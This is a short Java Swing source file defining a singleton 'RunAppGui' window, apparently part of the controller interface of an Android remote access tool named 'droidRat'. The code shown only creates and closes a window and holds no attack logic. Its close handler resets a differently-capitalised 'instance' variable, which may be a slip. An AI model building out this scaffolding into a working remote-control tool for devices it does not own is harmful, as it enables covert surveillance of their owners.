package com.je_chen.droidRat.gui.runappgui;

import com.je_chen.droidRat.gui.guisuper.GuiFather;
import com.je_chen.droidRat.gui.guisuper.GuiFatherInterface;

import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class RunAppGui extends GuiFather implements GuiFatherInterface {
    private static RunAppGui Instance;
    private JPanel jPanel;

    public static synchronized RunAppGui getInstance(String windowName) {
        if (Instance == null) {
            Instance = new RunAppGui();
            Instance.show(windowName);
        }
        return Instance;
    }

    @Override
    protected void closeEvent() {
        super.closeEvent();
        instance = null;
    }
}
